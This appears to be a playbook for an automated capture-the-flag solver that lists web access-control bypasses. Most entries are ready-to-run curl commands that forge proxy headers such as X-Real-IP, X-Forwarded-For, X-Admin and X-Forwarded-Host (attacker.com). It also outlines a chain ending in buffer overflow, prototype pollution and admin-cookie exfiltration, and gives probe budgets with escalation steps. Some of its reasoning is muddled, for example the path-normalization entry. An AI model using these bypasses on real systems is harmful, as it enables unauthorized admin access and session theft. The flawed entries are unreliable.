# Per-mechanism — every parser-differential mechanism, exhaustively

The mechanism map — a header the app reads, a check the header gates.

---

## 1. The hop-by-hop bypass — the verified card's mechanism

```bash
# the verified card's step 1 — a proxy strip
curl "$BASE/api/restricted" -H 'Connection: keep-alive, X-Real-IP'
#   the proxy strips its own X-Real-IP before forwarding
#   → the app sees a request without the trusted header
#   → a missing-header fallback → the app treats the request as local
#   → the token_required check skipped → the restricted route reached
```

## 2. The client-supplied bypass — a forged proxy-header

```bash
# a client-supplied proxy header — a forged local IP
curl "$BASE/api/admin" -H 'X-Real-IP: 127.0.0.1'
#   the app trusts the header → a local request → the trust check bypassed
```

## 3. The forwarded-host rewrite — a stored injection

```bash
# a client-supplied X-Forwarded-Host — the app's links rewritten
curl "$BASE/page" -H 'X-Forwarded-Host: attacker.com'
#   the app's links point to attacker.com → a stored injection
```

## 4. The forwarded-scheme downgrade — a scheme confusion

```bash
# a client-supplied X-Forwarded-Scheme — the app's links rewritten
curl "$BASE/page" -H 'X-Forwarded-Scheme: http'
#   the app's links use http → a downgrade surface
```

## 5. The X-Original-URL rewrite — a path-rewrite

```bash
# a client-supplied X-Original-URL — the app's path rewritten
curl "$BASE/page" -H 'X-Original-URL: /admin'
#   the app serves /admin under /page → a path-rewrite
```

## 6. The internal-flag bypass — a flag-forgery

```bash
# a client-supplied X-Internal — the internal-route check bypassed
curl "$BASE/internal" -H 'X-Internal: true'
#   the check passes → the internal route reached
```

## 7. The admin-flag bypass — a flag-forgery

```bash
# a client-supplied X-Admin — the admin check bypassed
curl "$BASE/admin" -H 'X-Admin: true'
#   the check passes → the admin route reached
```

## 8. The forwarded-for spoof — a local-IP forgery

```bash
# a client-supplied X-Forwarded-For — the local-vs-remote check bypassed
curl "$BASE/api/admin" -H 'X-Forwarded-For: 127.0.0.1'
#   the check passes → a local request → the trust check bypassed
```

## 9. The Forwarded-header spoof — an RFC 7239 forgery

```bash
# a client-supplied Forwarded header — the local-vs-remote check bypassed
curl "$BASE/api/admin" -H 'Forwarded: for=127.0.0.1'
#   the check passes → a local request → the trust check bypassed
```

## 10. The path-normalization bypass — a normalization differential

```bash
# a path the proxy and the app normalize differently
curl "$BASE/static/../admin"
#   the proxy normalizes to /admin; the app routes to /admin → a confusion
```

## 11. The method-override bypass — a method forgery

```bash
# a client-supplied X-HTTP-Method-Override — the method rewritten
curl "$BASE/api" -H 'X-HTTP-Method-Override: DELETE' -d 'data'
#   the app treats it as DELETE → a method-override bypass
```

## 12. The X-Forwarded-User spoof — a user forgery

```bash
# a client-supplied X-Forwarded-User — the user check bypassed
curl "$BASE/api/user" -H 'X-Forwarded-User: admin'
#   the check passes → a forged admin user
```

## 13. The multi-proxy differential — a chained normalization

```bash
# a multi-proxy chain — a header each strips differently
curl "$BASE/page" -H 'X-Forwarded-Host: attacker.com'
#   the edge strips it; the origin doesn't → a chained differential
```

## 14. The multi-header bypass — a combined forgery

```bash
# a combined injection — a forged IP + a forged flag
curl "$BASE/api/internal" -H 'X-Real-IP: 127.0.0.1' -H 'X-Internal: true'
#   a local + an internal check → a privileged route reached
```

## 15. The hop-by-hop + token_required chain — the verified card's chain

```text
the verified card's chain:
step 1 — a proxy strips its own X-Real-IP → the app treats the request
         as local → the token_required check bypassed → a restricted
         route reached
step 2 — a cache-overflow → the cache daemon's strcpy overflows a
         fixed-size value → the write lands in the next entry's key →
         another user's record addressed
step 3 — a DOM-clobber prototype-pollution → the site's own script's
         DOM lookups clobbered → the fetch redirected → the prototype
         polluted → the eval's value attacker-controlled
step 4 — a polyglot exfil → the admin's cookie exfiltrated through the
         same-site store → the flag
```

## 16. The forwarded-host + XSS chain — a stored-injection reach

```text
a client-supplied X-Forwarded-Host → the app's links point to
attacker.com → the stored page's links fetch attacker.com → a stored-
XSS-like reach → the downstream.
```

## 17. The forwarded-scheme + downgrade chain — a scheme-confusion reach

```text
a client-supplied X-Forwarded-Scheme → the app's links use http → a
downgrade surface → a mixed-content or a downgrade → the downstream.
```

## 18. The path-normalization + route-confusion chain — a normalization reach

```text
a path the proxy and the app normalize differently → the proxy's check
reads a different path than the app's → a route-confusion reach → a
gated route → the downstream.
```

## 19. The internal-flag + privileged-route chain — a flag-bypass reach

```text
a client-supplied X-Internal: true → the internal-route check passes →
an internal route reached → the downstream.
```

## 20. The admin-flag + admin-route chain — a flag-bypass reach

```text
a client-supplied X-Admin: true → the admin check passes → an admin
route reached → the downstream.
```

## 21. The multi-proxy + chained-differential chain — a per-layer reach

```text
a multi-proxy chain → a header each strips differently → a chained
normalization boundary → a per-layer differential → a gated route →
the downstream.
```

## 22. The per-mechanism falsifier — when the mechanism is dead

```text
a proxy that doesn't strip its own header → the hop-by-hop bypass fails
a proxy that strips a client-supplied header → the client-supplied
  bypass fails → the hop-by-hop bypass is the vector
a proxy that verifies the header it added → the client-supplied bypass
  fails → the hop-by-hop bypass is the vector
a non-header check → a different class
the proxy and the app normalize the same way → no confusion
a stored copy → a cache-poisoning
a desync → a request-smuggling
a session check → an auth-session
a host check → a host-header
a fetch → an ssrf
a read → a cors
```

## 23. The per-mechanism budget — the probe limits

```text
5 probes or 15 minutes per mechanism class; 25 probes or 45 minutes
for the challenge. a spent budget → escalate: chain_match → reclassify
→ writeup_search → novel_plan → fanout_sweep → solver_handoff.
```
